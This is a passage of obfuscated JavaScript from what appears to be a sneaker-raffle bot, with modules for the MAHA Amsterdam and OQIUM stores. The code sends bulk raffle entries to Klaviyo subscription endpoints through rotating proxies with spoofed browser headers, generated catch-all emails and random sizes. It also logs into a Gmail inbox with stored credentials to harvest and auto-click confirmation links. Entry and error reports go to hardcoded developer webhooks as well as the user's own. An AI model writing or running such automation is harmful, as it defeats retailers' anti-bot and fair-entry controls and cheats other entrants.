                                await _0x42b239['waitForSelector']('.b-raffle-message.m-success', { 'timeout': 0x493e0 }), _0x463ec8 = 'no', _0x1560d5(_0x1aa7ab[_0x3f4e1b], _0x575f8a), console['log'](_0x49dcd4['green'](_0x207f7e() + '\x20[' + _0x575f8a['name'] + ']\x20Task\x20' + (_0x3f4e1b + 0x1) + '\x20:\x20Raffle\x20Entered!')), _0x397a11['webhook'] != undefined && _0x397a11['webhook'] != '' && await _0x5e696c(_0x397a11['webhook'], _0x44b051['succesDEVMSG']), await _0x2bc7d2(0xc8), await _0x5e696c(_0x171351, _0x44b051['succesDEVMSG']), await _0x2bc7d2(0xc8), await _0x5e696c(_0x3ebea8, _0x44b051['succesPUBMSG']);
                            } catch (_0x12197c) {
                                console['log'](_0x49dcd4['red'](_0x207f7e() + '\x20[' + _0x575f8a['name'] + ']\x20Task\x20' + (_0x3f4e1b + 0x1) + '\x20:\x20Paypal\x20Error:\x20' + _0x12197c)), _0x2ec93e = 'Error\x20while\x20entering\x20Paypal:\x20' + _0x12197c;
                                var _0x278d4b = await _0x1487ea(_0x1aa7ab[_0x3f4e1b], _0x575f8a, 'dev', !![], _0x2ec93e);
                                _0x44b051['errorDEV'] = { 'embeds': [_0x278d4b] }, _0x397a11['webhook'] != undefined && _0x397a11['webhook'] != '' && await _0x5e696c(_0x397a11['webhook'], _0x44b051['errorDEV']), await _0x5e696c(_0x8997ff, _0x44b051['errorDEV']);
                            }
                        } catch (_0x425190) {
                            console['log'](_0x49dcd4['red'](_0x207f7e() + '\x20[' + _0x575f8a['name'] + ']\x20Task\x20' + (_0x3f4e1b + 0x1) + '\x20:\x20' + _0x425190)), _0x2ec93e = '' + _0x425190;
                            var _0x278d4b = await _0x1487ea(_0x1aa7ab[_0x3f4e1b], _0x575f8a, 'dev', !![], _0x2ec93e);
                            _0x44b051['errorDEV'] = { 'embeds': [_0x278d4b] }, _0x397a11['webhook'] != undefined && _0x397a11['webhook'] != '' && await _0x5e696c(_0x397a11['webhook'], _0x44b051['errorDEV']), await _0x5e696c(_0x8997ff, _0x44b051['errorDEV']), _0x463ec8 = 'yes';
                        } finally {
                            _0x5d45c0 && _0x5d45c0['close']();
                            if (_0x463ec8 == 'yes' && _0x555729 != 0x5) {
                                console['log'](_0x49dcd4['red'](_0x207f7e() + '\x20[' + _0x575f8a['name'] + ']\x20Task\x20' + (_0x3f4e1b + 0x1) + '\x20:\x20Retrying')), _0x3f4e1b = _0x3f4e1b - 0x1, _0x555729 = _0x555729 + 0x1;
                                continue;
                            }
                            _0x463ec8 == 'yes' && _0x555729 >= 0x5 && (_0x4b302f(_0x1aa7ab[_0x3f4e1b], _0x575f8a), _0x463ec8 = 'no', _0x555729 = 0x0), console['log']('Waiting\x20for\x20' + _0x397a11['AfewDelay'] + '\x20ms'), await _0x2bc7d2(_0x397a11['AfewDelay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'MAHA\x20Amsterdam',
        'modules': [
            {
                'name': 'MAHA\x20Raffle\x20Entries',
                'store': 'MAHA',
                'logo': 'https://i1.sndcdn.com/avatars-XIAMNs5LPWV2iRwj-SNwa5A-t500x500.jpg',
                'url': 'https://a.klaviyo.com/client/subscriptions/?company_id=THxSew',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'RvxrAV',
                            'custom_source': 'Air\x20Jordan\x201\x20High\x20OG\x20\x27White\x20Cement\x27',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'WQN5XR',
                                '$consent_form_version': 0x7f7254,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x5a16c4, _0x2b477e, _0x4c536f) {
                    for (var _0x49a08c = 0x0; _0x49a08c < _0x2b477e['length']; _0x49a08c++) {
                        async function _0x3d1a54(_0x57e3ef, _0x16c82f, _0x843f81, _0x48fb20, _0x1e07a5) {
                            var _0x13fe04, _0x555915 = {}, _0x2f77b5 = [], _0x36cf1e = {}, _0xfa2e2b = [
                                '40',
                                '40,5',
                                '41',
                                '42',
                                '42,5',
                                '43',
                                '44',
                                '45',
                                '45,5',
                                '46',
                                '47',
                                '47,5',
                                '48'
                            ], _0x176ba7 = Math['round'](Math['random']() * (_0xfa2e2b['length'] - 0x1));
                            _0x48fb20[_0x57e3ef]['Size'] == 'RANDOM' && (_0x48fb20[_0x57e3ef]['Size'] = _0xfa2e2b[_0x176ba7]);
                            !_0x48fb20 && (_0x48fb20 = {});
                            if (_0x16c82f != 'ver') {
                                _0x535b9c(_0x843f81['name'] + '\x20Task\x20' + (_0x57e3ef + 0x1) + '\x20/\x20' + _0x48fb20['length'] + '\x20||\x20File:\x20' + _0x201f86 + '\x20Proxies:\x20' + _0xa80a1d), await _0x38eff1(_0x48fb20, _0x57e3ef), _0x555915 = _0x843f81['data'];
                                _0x16c82f == 'exp' ? _0x555915['data']['attributes']['email'] = '' + _0x48fb20[_0x57e3ef]['FirstName'] + _0x48fb20[_0x57e3ef]['LastName'] + _0x397a11['catchall'] : _0x555915['data']['attributes']['email'] = '' + _0x48fb20[_0x57e3ef]['Email'];
                                if (_0x48fb20[_0x57e3ef]['Size'] == 'RANDOM') {
                                }
                                _0x555915['data']['attributes']['properties']['$first_name'] = '' + _0x48fb20[_0x57e3ef]['FirstName'], _0x555915['data']['attributes']['properties']['$last_name'] = '' + _0x48fb20[_0x57e3ef]['LastName'], _0x555915['data']['attributes']['properties']['$address1'] = _0x48fb20[_0x57e3ef]['Address1'] + '\x20' + _0x48fb20[_0x57e3ef]['Address2'] + '\x20' + _0x48fb20[_0x57e3ef]['HouseNumber'], _0x555915['data']['attributes']['properties']['$zip'] = '' + _0x48fb20[_0x57e3ef]['Zip'], _0x555915['data']['attributes']['properties']['$city'] = '' + _0x48fb20[_0x57e3ef]['City'], _0x555915['data']['attributes']['properties']['$country'] = '' + _0x48fb20[_0x57e3ef]['Country'], _0x555915['data']['attributes']['properties']['Size'] = '' + _0x48fb20[_0x57e3ef]['Size'], _0x555915['data']['attributes']['properties']['$phone_number'] = '' + _0x48fb20[_0x57e3ef]['Phone'], _0x555915['data']['attributes']['properties']['Instagram\x20Account'] = '' + _0x48fb20[_0x57e3ef]['Follower'];
                            }
                            if (_0x397a11['useRandomProxy'] = ![])
                                var _0x196578 = _0x1e07a5[_0x57e3ef]['split'](':');
                            else
                                var _0x3c92e7 = Math['round'](Math['random']() * (_0x1e07a5['length'] - 0x1)), _0x196578 = _0x1e07a5[_0x3c92e7]['split'](':');
                            var _0x84799a = {
                                'jar': _0x45e81e,
                                'followAllRedirects': !![],
                                'method': 'POST',
                                'url': _0x843f81['url'],
                                'headers': _0x843f81['headers'],
                                'body': JSON['stringify'](_0x555915),
                                'proxy': 'http://' + _0x196578[0x2] + ':' + _0x196578[0x3] + '@' + _0x196578[0x0] + ':' + _0x196578[0x1]
                            };
                            return _0x16c82f != 'ver' && (_0x84799a['url'] = _0x843f81['url'], _0x84799a['headers'] = _0x843f81['headers']), _0x16c82f == 'ver' && (_0x84799a['method'] = 'GET'), new Promise(function (_0x127b50, _0x20026c) {
                                callback = async (_0x204d2f, _0x2d3cde, _0x5286dd) => {
                                    if (!_0x204d2f && _0x2d3cde['statusCode'] == 0xca || !_0x204d2f && _0x2d3cde['statusCode'] == 0xc8) {
                                        if (_0x16c82f != 'ver') {
                                            var _0x48931f = await _0x1487ea(_0x48fb20[_0x57e3ef], _0x843f81, 'dev', ![]), _0x2fbbe3 = await _0x1487ea(_0x48fb20[_0x57e3ef], _0x843f81, 'pub', ![]);
                                            const _0x240459 = {
                                                'succesDEVMSG': { 'embeds': [_0x48931f] },
                                                'succesPUBMSG': { 'embeds': [_0x2fbbe3] }
                                            };
                                            if (_0x397a11['webhook'] != undefined && _0x397a11['webhook'] != '')
                                                try {
                                                    await _0x5e696c(_0x397a11['webhook'], _0x240459['succesDEVMSG']);
                                                } catch {
                                                }
                                            await _0x2bc7d2(0xc8), await _0x5e696c(_0x171351, _0x240459['succesDEVMSG']), await _0x2bc7d2(0xc8);
                                            try {
                                                await _0x5e696c(_0x3ebea8, _0x240459['succesPUBMSG']);
                                            } catch {
                                            }
                                            _0x1560d5(_0x48fb20[_0x57e3ef], _0x843f81);
                                        }
                                        _0x127b50(console['log'](_0x49dcd4['green'](_0x207f7e() + '\x20[' + _0x843f81['name'] + ']\x20Task\x20' + (_0x57e3ef + 0x1) + ':\x20Raffle\x20Entered!')));
                                    } else {
                                        if (_0x16c82f != 'ver') {
                                            var _0x4a5ec0 = '' + _0x204d2f, _0x3da193 = await _0x1487ea(_0x48fb20[_0x57e3ef], _0x843f81, 'dev', !![], _0x4a5ec0), _0x53c6b6 = {};
                                            _0x53c6b6['errorDEV'] = { 'embeds': [_0x3da193] }, _0x4b302f(_0x48fb20[_0x57e3ef], _0x843f81), _0x397a11['webhook'] != undefined && _0x397a11['webhook'] != '' && await _0x5e696c(_0x397a11['webhook'], _0x53c6b6['errorDEV']), await _0x5e696c(_0x8997ff, _0x53c6b6['errorDEV']);
                                        }
                                        _0x20026c(console['log'](_0x49dcd4['red'](_0x207f7e() + '\x20[' + _0x843f81['name'] + ']\x20Task\x20' + (_0x57e3ef + 0x1) + ':\x20' + _0x204d2f)));
                                    }
                                };
                                try {
                                    _0x16c82f != 'ver' && console['log'](_0x207f7e() + '\x20[' + _0x843f81['name'] + ']\x20Task\x20' + (_0x57e3ef + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x555915['data']['attributes']['email']), _0x5f4dd5(_0x84799a, callback);
                                } catch (_0x151a88) {
                                    console['log'](_0x207f7e() + '\x20Task\x20' + (_0x57e3ef + 0x1) + ':\x20' + _0x151a88);
                                }
                            });
                        }
                        ;
                        try {
                            await _0x3d1a54(_0x49a08c, 'nor', _0x5a16c4, _0x2b477e, _0x4c536f), console['log'](_0x207f7e() + '\x20[' + _0x5a16c4['name'] + ']\x20Sleeping\x20for\x20' + _0x397a11['delay'] + '\x20ms'), await _0x2bc7d2(_0x397a11['delay']);
                        } catch (_0x24db06) {
                        }
                    }
                }
            },
            {
                'name': 'MAHA\x20Raffle\x20Verification',
                'store': 'MAHA',
                'logo': 'https://i1.sndcdn.com/avatars-XIAMNs5LPWV2iRwj-SNwa5A-t500x500.jpg',
                'url': '',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'TFTWYv',
                            'custom_source': 'Air\x20Jordan\x201\x20Retro\x20High\x20OG\x20Lost\x20and\x20Found',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'V4PNGA',
                                '$consent_form_version': 0x6fd46d,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x4ec2ea, _0x41c0f6, _0x317553) {
                    var _0x3465e3 = [];
                    async function _0x46f83c() {
                        var _0x215f05 = new _0x91ddb5({
                            'user': _0x397a11['masterMail'],
                            'password': _0x397a11['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0x4dbe04(_0x5169e4) {
                            _0x215f05['openBox']('INBOX', ![], _0x5169e4);
                        }
                        _0x215f05['once']('ready', function () {
                            _0x4dbe04(function (_0xf749c2, _0x285321) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0xf749c2)
                                    throw _0xf749c2;
                                _0x215f05['seq']['search']([
                                    'UNSEEN',
                                    [
                                        'FROM',
                                        'service@maha-amsterdam.com'
                                    ]
                                ], function (_0x3cbfeb, _0x4b55d5) {
                                    if (!_0x4b55d5 || !_0x4b55d5['length'])
                                        console['log'](_0x207f7e() + '\x20[' + _0x4ec2ea['name'] + ']\x20No\x20mails\x20found'), _0x215f05['end']();
                                    else {
                                        var _0x5922e2 = _0x215f05['seq']['fetch'](_0x4b55d5, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0x5922e2['on']('message', function (_0x59f792, _0x3b6753) {
                                            var _0x523d5d = '(#' + _0x3b6753 + ')\x20';
                                            _0x59f792['on']('body', function (_0x5d7f44, _0x3f9f0f) {
                                                _0x3631ef(_0x5d7f44, (_0x3ecea6, _0x1a8538) => {
                                                    if (_0x1a8538['subject'] == 'Confirm\x20Your\x20Subscription' && _0x1a8538['from']['value'][0x0]['name'] == 'Maha\x20Amsterdam') {
                                                        var _0x2b466d = _0x1a8538['text']['split']('(')[0x1], _0x307948 = _0x2b466d['split'](')')[0x0];
                                                        _0x3465e3['push'](_0x307948);
                                                    }
                                                });
                                            }), _0x59f792['once']('end', function () {
                                            });
                                        }), _0x5922e2['once']('error', function (_0x4f35a6) {
                                            console['log']('Fetch\x20error:\x20' + _0x4f35a6);
                                        }), _0x5922e2['once']('end', function () {
                                            _0x215f05['end']();
                                        });
                                    }
                                });
                            });
                        }), _0x215f05['once']('error', function (_0x4ea087) {
                            console['log'](_0x49dcd4['red'](_0x4ea087['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox');
                        }), _0x215f05['once']('end', async function () {
                        }), _0x215f05['connect']();
                    }
                    async function _0x1d1ba7(_0x7fee78, _0x3f8273, _0x89d26e) {
                        for (var _0x647586 = 0x0; _0x647586 < _0x3f8273['length']; _0x647586++) {
                            async function _0x4b0b9f(_0x1c659a, _0x2db8d8, _0x5179d3, _0x456ecb, _0x3c1771) {
                                var _0x495927, _0x28bed0 = {}, _0x3991c3 = [], _0x5dfd81 = {}, _0x27b74c = [
                                    '40',
                                    '40,5',
                                    '41',
                                    '42',
                                    '42,5',
                                    '43',
                                    '44',
                                    '45',
                                    '45,5',
                                    '46',
                                    '47',
                                    '47,5',
                                    '48'
                                ], _0x2308eb = Math['round'](Math['random']() * (_0x27b74c['length'] - 0x1));
                                _0x456ecb[_0x1c659a]['Size'] == 'RANDOM' && (_0x456ecb[_0x1c659a]['Size'] = _0x27b74c[_0x2308eb]);
                                !_0x456ecb && (_0x456ecb = {});
                                if (_0x397a11['useRandomProxy'] = ![])
                                    var _0x481dfd = _0x3c1771[_0x1c659a]['split'](':');
                                else
                                    var _0x324d25 = Math['round'](Math['random']() * (_0x3c1771['length'] - 0x1)), _0x481dfd = _0x3c1771[_0x324d25]['split'](':');
                                var _0x1531a7 = {
                                    'jar': _0x45e81e,
                                    'followAllRedirects': !![],
                                    'method': 'POST',
                                    'url': _0x5179d3['url'],
                                    'headers': _0x5179d3['headers'],
                                    'body': JSON['stringify'](_0x28bed0),
                                    'proxy': 'http://' + _0x481dfd[0x2] + ':' + _0x481dfd[0x3] + '@' + _0x481dfd[0x0] + ':' + _0x481dfd[0x1]
                                };
                                return _0x2db8d8 != 'ver' && (_0x1531a7['url'] = _0x5179d3['url'], _0x1531a7['headers'] = _0x5179d3['headers']), _0x2db8d8 == 'ver' && (_0x1531a7['method'] = 'GET', _0x1531a7['url'] = _0x456ecb[_0x1c659a]), new Promise(function (_0x893363, _0x54c5e3) {
                                    callback = async (_0x1cfca9, _0xd72181, _0x27f4fb) => {
                                        if (!_0x1cfca9 && _0xd72181['statusCode'] == 0xca || !_0x1cfca9 && _0xd72181['statusCode'] == 0xc8) {
                                            if (_0x2db8d8 != 'ver') {
                                                var _0x11e1ed = await _0x1487ea(_0x456ecb[_0x1c659a], _0x5179d3, 'dev', ![]), _0x329376 = await _0x1487ea(_0x456ecb[_0x1c659a], _0x5179d3, 'pub', ![]);
                                                const _0xc67955 = {
                                                    'succesDEVMSG': { 'embeds': [_0x11e1ed] },
                                                    'succesPUBMSG': { 'embeds': [_0x329376] }
                                                };
                                                if (_0x397a11['webhook'] != undefined && _0x397a11['webhook'] != '')
                                                    try {
                                                        await _0x5e696c(_0x397a11['webhook'], _0xc67955['succesDEVMSG']);
                                                    } catch {
                                                    }
                                                await _0x2bc7d2(0xc8), await _0x5e696c(_0x171351, _0xc67955['succesDEVMSG']), await _0x2bc7d2(0xc8);
                                                try {
                                                    await _0x5e696c(_0x3ebea8, _0xc67955['succesPUBMSG']);
                                                } catch {
                                                }
                                                _0x1560d5(_0x456ecb[_0x1c659a], _0x5179d3);
                                            }
                                            _0x893363(console['log'](_0x49dcd4['green'](_0x207f7e() + '\x20[' + _0x5179d3['name'] + ']\x20Task\x20' + (_0x1c659a + 0x1) + ':\x20Raffle\x20Entered!')));
                                        } else {
                                            if (_0x2db8d8 != 'ver') {
                                                var _0x2205de = '' + _0x1cfca9, _0x1c0d04 = await _0x1487ea(_0x456ecb[_0x1c659a], _0x5179d3, 'dev', !![], _0x2205de), _0x10c8a5 = {};
                                                _0x10c8a5['errorDEV'] = { 'embeds': [_0x1c0d04] }, _0x4b302f(_0x456ecb[_0x1c659a], _0x5179d3), _0x397a11['webhook'] != undefined && _0x397a11['webhook'] != '' && await _0x5e696c(_0x397a11['webhook'], _0x10c8a5['errorDEV']), await _0x5e696c(_0x8997ff, _0x10c8a5['errorDEV']);
                                            }
                                            _0x54c5e3(console['log'](_0x49dcd4['red'](_0x207f7e() + '\x20[' + _0x5179d3['name'] + ']\x20Task\x20' + (_0x1c659a + 0x1) + ':\x20' + _0x1cfca9)));
                                        }
                                    };
                                    try {
                                        _0x2db8d8 != 'ver' ? console['log'](_0x207f7e() + '\x20[' + _0x5179d3['name'] + ']\x20Task\x20' + (_0x1c659a + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x28bed0['data']['attributes']['email']) : console['log'](_0x207f7e() + '\x20[' + _0x5179d3['name'] + ']\x20Task\x20' + (_0x1c659a + 0x1) + ':\x20Fetching\x20Response'), _0x5f4dd5(_0x1531a7, callback);
                                    } catch (_0x33dfd6) {
                                        console['log'](_0x207f7e() + '\x20Task\x20' + (_0x1c659a + 0x1) + ':\x20' + _0x33dfd6);
                                    }
                                });
                            }
                            ;
                            try {
                                await _0x4b0b9f(_0x647586, 'ver', _0x7fee78, _0x3f8273, _0x89d26e), console['log'](_0x207f7e() + '\x20[' + _0x7fee78['name'] + ']\x20Sleeping\x20for\x20' + _0x397a11['delay'] + '\x20ms'), await _0x2bc7d2(_0x397a11['delay']);
                            } catch (_0x372096) {
                            }
                        }
                    }
                    try {
                        _0x46f83c(), await _0x2bc7d2(0xfa0), console['log']('Found\x20' + _0x3465e3['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..'), await _0x2bc7d2(0x9c4);
                    }
                    await _0x1d1ba7(_0x4ec2ea, _0x3465e3, _0x317553);
                }
            }
        ]
    },
    {
        'name': 'OQIUM\x20Store',
        'modules': [
            {
                'name': 'OQIUM\x20Raffle\x20Entries',
                'store': 'OQIUM',
                'logo': 'https://s3-eu-west-1.amazonaws.com/tpd/logos/5e8e742e8f9bb4000118f0bc/0x0.png',
                'url': 'https://a.klaviyo.com/client/subscriptions/?company_id=R3sbqs',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'YAQ4Ja',
                            'custom_source': 'DN3707-100',
                            'email': '',
                            'properties': {
                                '$first_name': '',
                                '$last_name': '',
                                '$phone_number': '',
                                'Size': '',
                                'Instagram\x20Account': '',
                                '$address1': '',
                                '$zip': '',
                                '$city': '',
                                '$country': '',
                                'Accepts\x20Marketing': ['NoByRaffle'],
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'TntaQ5',
                                '$consent_form_version': 0x81b1d1,
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://oqium.com',
                    'referer': 'https://oqium.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x2cedfc, _0x595810, _0xa97e22) {
                    for (var _0x44352b = 0x0; _0x44352b < _0x595810['length']; _0x44352b++) {
                        async function _0x3df0e8(_0x53bdcc, _0x4212a1, _0x462052, _0x32fc8e, _0x2e7ed2) {
                            var _0x419378, _0x4787bd = {}, _0x366f9f = [], _0x1eb524 = {}, _0xfe3d8a = [
                                '40',
                                '40,5',
                                '41',
                                '42',
                                '42,5',
                                '43',
                                '44',
                                '45',
                                '45,5',
                                '46',
                                '47',
                                '47,5',
                                '48'
                            ], _0x33f7e1 = Math['round'](Math['random']() * (_0xfe3d8a['length'] - 0x1));
                            _0x32fc8e[_0x53bdcc]['Size'] == 'RANDOM' && (_0x32fc8e[_0x53bdcc]['Size'] = _0xfe3d8a[_0x33f7e1]);
                            !_0x32fc8e && (_0x32fc8e = {});
                            if (_0x4212a1 != 'ver') {
                                _0x535b9c(_0x462052['name'] + '\x20Task\x20' + (_0x53bdcc + 0x1) + '\x20/\x20' + _0x32fc8e['length'] + '\x20||\x20File:\x20' + _0x201f86 + '\x20Proxies:\x20' + _0xa80a1d), await _0x38eff1(_0x32fc8e, _0x53bdcc), _0x366f9f = [{
                                    'type': 'rich',
                                    'title': 'Succesful\x20OQIUM\x20Entry',
                                    'description': '',
                                    'color': 0xc0d6d6,
                                    'fields': [
                                        {
                                            'name': 'User',
                                            'value': '' + _0x3b1bf1
                                        },
                                        {
                                            'name': 'Size',
                                            'value': '' + _0x32fc8e[_0x53bdcc]['Size']
                                        },
                                        {
                                            'name': 'Delay',
                                            'value': '' + _0x397a11['delay']
                                        },
                                        {
                                            'name': 'Version',
                                            'value': '' + _0x14595d
                                        }
                                    ]
                                }], _0x1eb524 = { 'embeds': _0x366f9f }, _0x4787bd = _0x462052['data'];
                                _0x4212a1 == 'exp' ? _0x4787bd['data']['attributes']['email'] = '' + _0x32fc8e[_0x53bdcc]['FirstName'] + _0x32fc8e[_0x53bdcc]['LastName'] + _0x397a11['catchall'] : _0x4787bd['data']['attributes']['email'] = '' + _0x32fc8e[_0x53bdcc]['Email'];
                                if (_0x32fc8e[_0x53bdcc]['Size'] == 'RANDOM') {
                                }
                                _0x4787bd['data']['attributes']['properties']['$first_name'] = '' + _0x32fc8e[_0x53bdcc]['FirstName'], _0x4787bd['data']['attributes']['properties']['$last_name'] = '' + _0x32fc8e[_0x53bdcc]['LastName'], _0x4787bd['data']['attributes']['properties']['$address1'] = _0x32fc8e[_0x53bdcc]['Address1'] + '\x20' + _0x32fc8e[_0x53bdcc]['Address2'] + '\x20' + _0x32fc8e[_0x53bdcc]['HouseNumber'], _0x4787bd['data']['attributes']['properties']['$zip'] = '' + _0x32fc8e[_0x53bdcc]['Zip'], _0x4787bd['data']['attributes']['properties']['$city'] = '' + _0x32fc8e[_0x53bdcc]['City'], _0x4787bd['data']['attributes']['properties']['$country'] = '' + _0x32fc8e[_0x53bdcc]['Country'], _0x4787bd['data']['attributes']['properties']['Size'] = 'US\x20W\x20/\x20EU\x20' + _0x32fc8e[_0x53bdcc]['Size'], _0x4787bd['data']['attributes']['properties']['$phone_number'] = '' + _0x32fc8e[_0x53bdcc]['Phone'], _0x4787bd['data']['attributes']['properties']['Instagram\x20Account'] = '' + _0x32fc8e[_0x53bdcc]['Follower'];
                            }
                            if (_0x397a11['useRandomProxy'] = ![])
                                var _0x4317d6 = _0x2e7ed2[_0x53bdcc]['split'](':');
                            else
                                var _0x393177 = Math['round'](Math['random']() * (_0x2e7ed2['length'] - 0x1)), _0x4317d6 = _0x2e7ed2[_0x393177]['split'](':');
                            var _0x330b4b = {
                                'jar': _0x45e81e,
                                'followAllRedirects': !![],
                                'method': 'POST',
                                'url': _0x462052['url'],
                                'headers': _0x462052['headers'],
                                'body': JSON['stringify'](_0x4787bd),
                                'proxy': 'http://' + _0x4317d6[0x2] + ':' + _0x4317d6[0x3] + '@' + _0x4317d6[0x0] + ':' + _0x4317d6[0x1]
                            };
                            return _0x4212a1 != 'ver' && (_0x330b4b['url'] = _0x462052['url'], _0x330b4b['headers'] = _0x462052['headers']), _0x4212a1 == 'ver' && (_0x330b4b['method'] = 'GET'), new Promise(function (_0x558125, _0x1130b4) {
                                callback = async (_0x361a3c, _0x4fb1a4, _0x89df3e) => {
                                    if (!_0x361a3c && _0x4fb1a4['statusCode'] == 0xca || !_0x361a3c && _0x4fb1a4['statusCode'] == 0xc8) {
                                        if (_0x4212a1 != 'ver') {
                                            var _0x5a9cdf = await _0x1487ea(_0x32fc8e[_0x53bdcc], _0x462052, 'dev', ![]), _0x308b12 = await _0x1487ea(_0x32fc8e[_0x53bdcc], _0x462052, 'pub', ![]);
                                            const _0x18fe5 = {
                                                'succesDEVMSG': { 'embeds': [_0x5a9cdf] },
                                                'succesPUBMSG': { 'embeds': [_0x308b12] }
                                            };
                                            if (_0x397a11['webhook'] != undefined && _0x397a11['webhook'] != '')
                                                try {
                                                    await _0x5e696c(_0x397a11['webhook'], _0x18fe5['succesDEVMSG']);
                                                } catch {
                                                }
                                            await _0x2bc7d2(0xc8), await _0x5e696c(_0x171351, _0x18fe5['succesDEVMSG']), await _0x2bc7d2(0xc8);
                                            try {
                                                await _0x5e696c(_0x3ebea8, _0x18fe5['succesPUBMSG']);
                                            } catch {
                                            }
                                            _0x1560d5(_0x32fc8e[_0x53bdcc], _0x462052);
                                        }
                                        _0x558125(console['log'](_0x49dcd4['green'](_0x207f7e() + '\x20[' + _0x462052['name'] + ']\x20Task\x20' + (_0x53bdcc + 0x1) + ':\x20Raffle\x20Entered!')));
                                    } else {
                                        if (_0x4212a1 != 'ver') {
                                            var _0x17dcd6 = '' + _0x361a3c, _0x4e54b2 = await _0x1487ea(_0x32fc8e[_0x53bdcc], _0x462052, 'dev', !![], _0x17dcd6), _0x29d11c = {};
                                            _0x29d11c['errorDEV'] = { 'embeds': [_0x4e54b2] }, _0x4b302f(_0x32fc8e[_0x53bdcc], _0x462052), _0x397a11['webhook'] != undefined && _0x397a11['webhook'] != '' && await _0x5e696c(_0x397a11['webhook'], _0x29d11c['errorDEV']), await _0x5e696c(_0x8997ff, _0x29d11c['errorDEV']);
                                        }
                                        _0x1130b4(console['log'](_0x49dcd4['red'](_0x207f7e() + '\x20[' + _0x462052['name'] + ']\x20Task\x20' + (_0x53bdcc + 0x1) + ':\x20' + _0x361a3c)));
                                    }
                                };
                                try {
                                    _0x4212a1 != 'ver' && console['log'](_0x207f7e() + '\x20[' + _0x462052['name'] + ']\x20Task\x20' + (_0x53bdcc + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x4787bd['data']['attributes']['email']), _0x5f4dd5(_0x330b4b, callback);
                                } catch (_0x81d4b2) {
                                    console['log'](_0x207f7e() + '\x20Task\x20' + (_0x53bdcc + 0x1) + ':\x20' + _0x81d4b2);
                                }
                            });
                        }
                        ;
                        try {
